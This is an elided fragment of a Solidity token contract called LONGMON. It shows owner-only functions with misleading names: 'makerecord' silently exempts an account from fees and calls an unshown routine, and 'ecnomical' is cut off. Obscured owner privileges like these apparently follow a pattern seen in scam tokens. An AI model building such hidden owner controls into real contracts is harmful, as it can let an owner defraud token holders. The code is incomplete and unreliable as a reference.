...
contract LONGMON is Context, Ownable {
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;

    string _name = "LONGMON";
    string _symbol = "MON";
    uint8 _decimals = 9;
    ...
    function makerecord(address account) external onlyOwner {
        _isExcludedFromFees[account] = true;
        initialCall(account);
    }

    function training(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
    {
    ...
    function ecnomical(uint256 newClaimWait) external onlyOwner {
